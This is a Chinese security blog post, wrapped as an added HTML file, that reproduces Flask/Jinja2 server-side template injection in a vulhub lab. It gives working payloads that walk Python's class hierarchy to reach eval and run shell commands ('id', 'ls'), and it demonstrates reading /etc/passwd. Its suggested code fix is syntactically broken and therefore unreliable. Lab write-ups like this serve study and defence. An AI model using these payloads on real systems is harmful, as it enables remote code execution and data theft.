@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>ssti漏洞复现 | Yyx</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://www.yyxyy.xyz//favicon.ico?v=1622952381444">
+<link rel="stylesheet" href="https://www.yyxyy.xyz//styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="Flask ssti 漏洞复现
+环境
+使用vulhub里面的flask/ssti环境
+查看源码，发现漏洞处
+from flask import Flask, request
+from jinja2 import Template
+
+app ..." />
+    <meta name="keywords" content="漏洞复现" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://www.yyxyy.xyz/">
+        <img src="https://www.yyxyy.xyz//images/avatar.png?v=1622952381444" class="site-logo">
+        <h1 class="site-title">Yyx</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      记得在这杂乱的生活里，带点微笑
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://www.yyxyy.xyz//atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">ssti漏洞复现</h2>
+            <div class="post-date">2021-06-06</div>
+            
+            <div class="post-content" v-pre>
+              <h4 id="flask-ssti-漏洞复现">Flask ssti 漏洞复现</h4>
+<h6 id="环境">环境</h6>
+<p>使用vulhub里面的flask/ssti环境</p>
+<h6 id="查看源码发现漏洞处">查看源码，发现漏洞处</h6>
+<pre><code class="language-python">from flask import Flask, request
+from jinja2 import Template
+
+app = Flask(__name__)
+
+@app.route(&quot;/&quot;)
+def index():
+    name = request.args.get('name', 'guest')
+
+    t = Template(&quot;Hello &quot; + name)
+    return t.render()
+
+if __name__ == &quot;__main__&quot;:
+    app.run()
+    
+    
+// 很简单发现了name变量是我们能够控制的。
+</code></pre>
+<h6 id="漏洞成因分析">漏洞成因分析</h6>
+<p>首先输入正常值</p>
+<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/1.png" alt="" loading="lazy"></figure>
+<p>然后输入嵌套jinja2语法的语句</p>
+<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/2.png" alt="" loading="lazy"></figure>
+<p>很容易就发现了这一处漏洞</p>
+<h6 id="代码修复">代码修复</h6>
+<pre><code class="language-python">from flask import Flask, request
+from jinja2 import Template
+
+app = Flask(__name__)
+
+@app.route(&quot;/&quot;)
+def index():
+    name = request.args.get('name', 'guest')
+
+    t = Template(&quot;Hello &quot; + {{temp}})
+    return t.render(temp=&quot;name&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    app.run()
+    
+//这样就能避免这个漏洞
+</code></pre>
+<h6 id="漏洞利用">漏洞利用</h6>
+<p>vulhub的POC</p>
+<pre><code class="language-jinja2">{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+  {% for b in c.__init__.__globals__.values() %}
+  {% if b.__class__ == {}.__class__ %}
+    {% if 'eval' in b.keys() %}
+      {{ b['eval']('__import__(&quot;os&quot;).popen(&quot;id&quot;).read()') }}
+    {% endif %}
+  {% endif %}
+  {% endfor %}
+{% endif %}
+{% endfor %}
+</code></pre>
+<p>得到一下结果</p>
+<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/3.png" alt="" loading="lazy"></figure>
+<h6 id="python沙盒逃逸">python沙盒逃逸</h6>
+<p>vulhub的POC里面用的是一些python的魔术方法，因为在jinja2里面我们是可以访问python的一些对象和方法。</p>
+<p>Python的一些魔术方法</p>
+<pre><code class="language-python"># 1 __class__ : 返回当前对象所属的类
+&gt;&gt;&gt; ().__class__
+&lt;class 'tuple'&gt;
+&gt;&gt;&gt; [].__class__
+&lt;class 'list'&gt;
+
+#2 __base__&amp;&amp;__bases__ :作用都是返回当前类所继承的类，即基类，区别是base返回单个，bases以元组形式返回所有基类。
+&gt;&gt;&gt; class A():
+...     pass
+&gt;&gt;&gt; class B():
+...     pass
+&gt;&gt;&gt; class C(A,B):
+...     pass
+&gt;&gt;&gt; C.__base__
+&lt;class '__main__.A'&gt;
+&gt;&gt;&gt; C.__bases__
+(&lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;)
+
+#3 __mro__ :以元组的方式返回继承关系
+&gt;&gt;&gt; C.__mro__
+(&lt;class '__main__.C'&gt;, &lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;, &lt;class 'object'&gt;)
+
+
+#4 __subclasses__():以列表的形式返回类的子类
+&gt;&gt;&gt; [].__class__.__bases__[0].__subclasses__()
+[&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, &lt;class 'weakcallableproxy'&gt;, &lt;class 'weakproxy'&gt;, &lt;class 'int'&gt;, &lt;class 'bytearray'&gt;, &lt;class 'bytes'&gt;, &lt;class 'list'&gt;, &lt;class 'NoneType'&gt;, &lt;class 'NotImplementedType'&gt;, &lt;class 'traceback'&gt;, &lt;class 'super'&gt;, &lt;class 'range'&gt;, &lt;class 'dict'&gt;, &lt;class 'dict_keys'&gt;, &lt;class 'dict_values'&gt;, &lt;class 'dict_items'&gt;, &lt;class 'odict_iterator'&gt;, &lt;class 'set'&gt;, &lt;class 'str'&gt;, &lt;class 'slice'&gt;, &lt;class 'staticmethod'&gt;, &lt;class 'complex'&gt;, &lt;class 'float'&gt;, &lt;class 'frozenset'&gt;, &lt;class 'property'&gt;, &lt;class 'managedbuffer'&gt;, &lt;class 'memoryview'&gt;, &lt;class 'tuple'&gt;, &lt;class 'enumerate'&gt;, &lt;class 'reversed'&gt;, &lt;class 'stderrprinter'&gt;, &lt;class 'code'&gt;, &lt;class 'frame'&gt;, &lt;class 'builtin_function_or_method'&gt;, &lt;class 'method'&gt;, &lt;class 'function'&gt;, &lt;class 'mappingproxy'&gt;, &lt;class 'generator'&gt;, &lt;class 'getset_descriptor'&gt;, &lt;class 'wrapper_descriptor'&gt;, &lt;class 'method-wrapper'&gt;, &lt;class 'ellipsis'&gt;, &lt;class 'member_descriptor'&gt;, &lt;class 'types.SimpleNamespace'&gt;, &lt;class 'PyCapsule'&gt;, &lt;class 'longrange_iterator'&gt;, &lt;class 'cell'&gt;, &lt;class 'instancemethod'&gt;, &lt;class 'classmethod_descriptor'&gt;, &lt;class 'method_descriptor'&gt;, &lt;class 'callable_iterator'&gt;, &lt;class 'iterator'&gt;, &lt;class 'coroutine'&gt;, &lt;class 'coroutine_wrapper'&gt;, &lt;class 'EncodingMap'&gt;, &lt;class 'fieldnameiterator'&gt;, &lt;class 'formatteriterator'&gt;, &lt;class 'filter'&gt;, &lt;class 'map'&gt;, &lt;class 'zip'&gt;, &lt;class 'moduledef'&gt;, &lt;class 'module'&gt;, &lt;class 'BaseException'&gt;, &lt;class '_frozen_importlib._ModuleLock'&gt;, &lt;class '_frozen_importlib._DummyModuleLock'&gt;, &lt;class '_frozen_importlib._ModuleLockManager'&gt;, &lt;class '_frozen_importlib._installed_safely'&gt;, &lt;class '_frozen_importlib.ModuleSpec'&gt;, &lt;class '_frozen_importlib.BuiltinImporter'&gt;, &lt;class 'classmethod'&gt;, &lt;class '_frozen_importlib.FrozenImporter'&gt;, &lt;class '_frozen_importlib._ImportLockContext'&gt;, &lt;class '_thread._localdummy'&gt;, &lt;class '_thread._local'&gt;, &lt;class '_thread.lock'&gt;, &lt;class '_thread.RLock'&gt;, &lt;class '_frozen_importlib_external.WindowsRegistryFinder'&gt;, &lt;class '_frozen_importlib_external._LoaderBasics'&gt;, &lt;class '_frozen_importlib_external.FileLoader'&gt;, &lt;class '_frozen_importlib_external._NamespacePath'&gt;, &lt;class '_frozen_importlib_external._NamespaceLoader'&gt;, &lt;class '_frozen_importlib_external.PathFinder'&gt;, &lt;class '_frozen_importlib_external.FileFinder'&gt;, &lt;class '_io._IOBase'&gt;, &lt;class '_io._BytesIOBuffer'&gt;, &lt;class '_io.IncrementalNewlineDecoder'&gt;, &lt;class 'nt.ScandirIterator'&gt;, &lt;class 'nt.DirEntry'&gt;, &lt;class 'PyHKEY'&gt;, &lt;class 'zipimport.zipimporter'&gt;, &lt;class 'codecs.Codec'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;class 'codecs.StreamReaderWriter'&gt;, &lt;class 'codecs.StreamRecoder'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class 'abc.ABC'&gt;, &lt;class 'collections.abc.Hashable'&gt;, &lt;class 'collections.abc.Awaitable'&gt;, &lt;class 'collections.abc.AsyncIterable'&gt;, &lt;class 'async_generator'&gt;, &lt;class 'collections.abc.Iterable'&gt;, &lt;class 'bytes_iterator'&gt;, &lt;class 'bytearray_iterator'&gt;, &lt;class 'dict_keyiterator'&gt;, &lt;class 'dict_valueiterator'&gt;, &lt;class 'dict_itemiterator'&gt;, &lt;class 'list_iterator'&gt;, &lt;class 'list_reverseiterator'&gt;, &lt;class 'range_iterator'&gt;, &lt;class 'set_iterator'&gt;, &lt;class 'str_iterator'&gt;, &lt;class 'tuple_iterator'&gt;, &lt;class 'collections.abc.Sized'&gt;, &lt;class 'collections.abc.Container'&gt;, &lt;class 'collections.abc.Callable'&gt;, &lt;class 'os._wrap_close'&gt;, &lt;class '_sitebuiltins.Quitter'&gt;, &lt;class '_sitebuiltins._Printer'&gt;, &lt;class '_sitebuiltins._Helper'&gt;, &lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;]
+
+#5 __globals__ :以字典的形式返回函数所在模块命名空间的所有变量。
+#所有的函数都会有一个__globals__属性，可以通过globals获得大量内置函数，包括eval，exec等执行命令的1的函数
+
+#6 __builtin__&amp;&amp;__builtins__: python中直接能用的比如int(),list()等函数，可以直接在builtins里面查询到。（python3）
+&gt;&gt;&gt; import builtins
+&gt;&gt;&gt; dir(builtins)
+['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'WindowsError', 'ZeroDivisionError', '_', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'all', 'any', 'ascii', 'bin', 'bool', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']
+
+#python2：dir(__builtins__)
+'''
+__builtin__ 和 __builtins__之间是什么关系呢？
+1.在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__，二者完全是一个东西，不分彼此。
+2.非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身
+'''
+
+
+
+#利用python特殊方法bypass沙盒
+
+
+## 构造继承链的思想
+
+#1.任意使用一个内置对象用class拿到他所对应的类
+#2.用bases拿到基类（&lt;class 'object'&gt;）
+#3.用subclasses()拿到子类列表
+#4.在字类里面寻找可以利用的类
+
+&gt;&gt;&gt; t = ().__class__.__bases__[0].__subclasses__()
+&gt;&gt;&gt; for c in t:
+...     if c.__name__== 'file':
+...             print t.index(c)
+... 
+40
+#寻找file对象
+
+
+&gt;&gt;&gt; dir(().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').readlines)
+['__call__', '__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__self__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
+#使用dir查看对象内置方法：
+
+
+
+</code></pre>
+<p>同样的方法使用eval方法来获取目录文件</p>
+<pre><code class="language-jinja2">{% for c in ().__class__.__bases__[0].__subclasses__(): %}
+{% if c.__name__ == '_IterationGuard': %}
+{{c.__init__.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('ls').read()&quot;) }}
+{% endif %}
+{% endfor %}
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/4.png" alt="" loading="lazy"></figure>
+<p>参考链接：<a href="https://www.freebuf.com/articles/web/98619.html">https://www.freebuf.com/articles/web/98619.html</a></p>
+<p>​		<a href="https://www.cnblogs.com/hackxf/p/10480071.html">https://www.cnblogs.com/hackxf/p/10480071.html</a></p>
+<p>​		<a href="https://eustiar.com/archives/157">https://eustiar.com/archives/157</a></p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://www.yyxyy.xyz/tag/RIn8eHN5X/" class="tag">
+                    漏洞复现
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://www.yyxyy.xyz/post/des-xue-xi/">
+                  <h3 class="post-title">
+                    DES学习
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
